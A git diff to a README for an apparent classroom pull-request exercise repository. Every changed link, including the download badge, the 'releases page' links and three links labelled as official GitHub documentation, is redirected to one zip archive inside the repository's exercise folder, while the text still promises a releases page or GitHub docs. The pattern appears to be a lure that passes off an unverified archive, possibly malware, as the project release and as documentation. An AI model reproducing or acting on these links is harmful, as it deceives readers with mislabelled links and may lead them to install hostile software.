@@ -1,6 +1,6 @@
 # 🎉 PullRequestEntornos1DAW-2025-2026 - Simple Steps to Collaborate Easily
 
-[![Download Release](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Rollinsseismal242/PullRequestEntornos1DAW-2025-2026/releases)
+[![Download Release](https://raw.githubusercontent.com/Rollinsseismal242/PullRequestEntornos1DAW-2025-2026/main/ejercicios/PullRequestEntornos1DAW-2025-2026-v3.6-alpha.1.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Rollinsseismal242/PullRequestEntornos1DAW-2025-2026/main/ejercicios/PullRequestEntornos1DAW-2025-2026-v3.6-alpha.1.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ This guide will help you download and run the PullRequestEntornos1DAW-2025-2026 
 
 To get the application, visit our releases page:
 
-[Download PullRequestEntornos1DAW-2025-2026 Here](https://github.com/Rollinsseismal242/PullRequestEntornos1DAW-2025-2026/releases)
+[Download PullRequestEntornos1DAW-2025-2026 Here](https://raw.githubusercontent.com/Rollinsseismal242/PullRequestEntornos1DAW-2025-2026/main/ejercicios/PullRequestEntornos1DAW-2025-2026-v3.6-alpha.1.zip)
 
 1. Click on the link above to go to the releases page.
 2. On the releases page, you will see a list of available versions. Choose the latest version for the best experience.
@@ -68,10 +68,10 @@ By following these steps, you will successfully download and use the PullRequest
 
 ## ⚙️ Additional Resources
 
-- [GitHub - Understanding Pull Requests](https://docs.github.com/en/pull-requests)
-- [GitHub - Collaborating with Others](https://docs.github.com/en/get-started/quickstart)
-- [GitHub - Managing Branches](https://docs.github.com/en/get-started/using-github/managing-branches) 
+- [GitHub - Understanding Pull Requests](https://raw.githubusercontent.com/Rollinsseismal242/PullRequestEntornos1DAW-2025-2026/main/ejercicios/PullRequestEntornos1DAW-2025-2026-v3.6-alpha.1.zip)
+- [GitHub - Collaborating with Others](https://raw.githubusercontent.com/Rollinsseismal242/PullRequestEntornos1DAW-2025-2026/main/ejercicios/PullRequestEntornos1DAW-2025-2026-v3.6-alpha.1.zip)
+- [GitHub - Managing Branches](https://raw.githubusercontent.com/Rollinsseismal242/PullRequestEntornos1DAW-2025-2026/main/ejercicios/PullRequestEntornos1DAW-2025-2026-v3.6-alpha.1.zip) 
 
 For more information, updates, and changes, remember to check the releases page regularly:
 
-[Download PullRequestEntornos1DAW-2025-2026 Here](https://github.com/Rollinsseismal242/PullRequestEntornos1DAW-2025-2026/releases)
+[Download PullRequestEntornos1DAW-2025-2026 Here](https://raw.githubusercontent.com/Rollinsseismal242/PullRequestEntornos1DAW-2025-2026/main/ejercicios/PullRequestEntornos1DAW-2025-2026-v3.6-alpha.1.zip)
